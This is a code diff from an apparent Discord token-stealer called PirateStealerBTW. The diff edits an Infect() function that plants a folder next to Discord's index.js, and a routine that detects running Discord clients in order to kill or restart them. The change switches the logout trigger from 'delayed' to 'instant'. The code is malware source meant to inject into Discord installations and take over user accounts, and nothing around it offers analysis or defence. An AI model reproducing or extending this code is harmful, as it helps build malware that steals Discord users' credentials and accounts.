@@ -59,10 +59,10 @@ function Infect() {
                     let folder = file.replace("index.js", "PirateStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
-                        if (config.logout == "delayed") {
+                        if (config.logout == "instant") {
                             startDiscord();
                         }
-                    } else if (fs.existsSync(folder) && config.logout == "delayed" ){
+                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                         startDiscord();
                     }
                 }
@@ -80,7 +80,7 @@ function listDiscords() {
         if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
         if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
-        if (config.logout == "delayed") {
+        if (config.logout == "instant") {
             killDiscord();
         } else {
             if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
